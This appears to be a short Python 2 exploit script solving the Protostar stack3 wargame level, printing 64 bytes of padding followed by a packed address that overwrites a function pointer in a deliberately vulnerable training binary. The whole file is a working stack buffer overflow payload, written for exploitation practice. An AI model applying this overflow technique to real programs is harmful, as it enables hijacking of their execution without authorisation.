#!/usr/bin/python
# http://liveoverflow.com/binary_hacking/protostar/stack3.html
import struct
 
padding="A"*64
payload = struct.pack("I",0x8048424)
print padding+payload
